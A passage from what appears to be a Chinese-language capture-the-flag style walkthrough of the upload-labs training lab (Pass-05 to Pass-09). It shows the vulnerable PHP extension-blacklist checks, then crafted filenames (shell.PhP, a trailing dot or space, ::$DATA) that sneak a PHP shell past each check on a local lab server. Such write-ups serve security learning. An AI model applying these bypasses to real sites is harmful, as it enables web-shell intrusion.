punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> $file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        $file_ext <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>黑名单判断加入<code>.htaccess</code>,但是源代码中没有<code>$file_ext = strtolower($file_ext); //转换为小写</code>这一行代码，可以使用大小写绕过。</p><h4 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>上传文件名<code>shell.PhP</code></p></li><li><p>访问<a href="http://192.168.2.104/upload/xxxx.PhP成功" target="_blank" rel="noopener">http://192.168.2.104/upload/xxxx.PhP成功</a>~</p></li></ul><h3 id="Pass-06-空格"><a href="#Pass-06-空格" class="headerlink" title="Pass-06 空格"></a>Pass-06 空格</h3><h4 id="提示与查看源码-5"><a href="#提示与查看源码-5" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|</p><p>.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|</p><p>.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        $file_ext <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> $file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'此文件不允许上传'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>源代码缺少<code>$file_ext = trim($file_ext); //首尾去空</code>，利用Windows系统的文件名特性，在文件名最后增加空格可以文件名后缀增加空格绕过。</p><h4 id="解题步骤-5"><a href="#解题步骤-5" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>上传文件名为<code>shell.php</code></p></li><li><p><code>Burp Suite</code>抓包修改包内容为：</p></li></ul><p><img src="http://106.52.86.96/202009060800/image-20200906161237733.png" alt=""></p><ul><li>​    访问<a href="http://192.168.2.104/upload/xxxx.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/xxxx.php成功</a>~</li></ul><h3 id="Pass-07-点"><a href="#Pass-07-点" class="headerlink" title="Pass-07 点"></a>Pass-07 点</h3><h4 id="提示与查看源码-6"><a href="#提示与查看源码-6" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass禁止上传所有可以解析的后缀！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        $file_ext <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> $file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        $file_ext <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span>$file_name<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>源代码缺少<code>$file_name = deldot($file_name);//删除文件名末尾的点</code>限制，可以文件名后缀增加<code>.</code>绕过，windows系统下会自动去掉后缀名中最后的<code>.</code></p><h4 id="解题步骤-6"><a href="#解题步骤-6" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li>使用BP修改，上传文件名<code>shell.php.</code></li><li>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</li></ul><h3 id="Pass-08-DATA"><a href="#Pass-08-DATA" class="headerlink" title="Pass-08 DATA"></a>Pass-08 DATA</h3><h4 id="提示与查看源码-7"><a href="#提示与查看源码-7" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|</p><p>.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|</p><p>.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_name <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        $file_ext <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $file_ext <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        $file_ext <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span> $deny_ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        $msg <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用Windows下NTFS文件系统的一个特性，即NTFS文件系统存储数据流的一个属性$DATA，当我们访问aa.asp::$DATA时，就是请求aa.asp本身的数据。可以在后缀名后加<code>**::$DATA**</code></p><h4 id="解题步骤-7"><a href="#解题步骤-7" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>使用BP修改，上传文件名<code>shell.php::$DATA</code></p></li><li><p>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</p></li></ul><h3 id="Pass-09-点-空格-点"><a href="#Pass-09-点-空格-点" class="headerlink" title="Pass-09 点+空格+点"></a>Pass-09 点+空格+点</h3><h4 id="提示与查看源码-8"><a href="#提示与查看源码-8" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass只允许上传.jpg|.png|.gif后缀的文件！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $deny_ext <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token 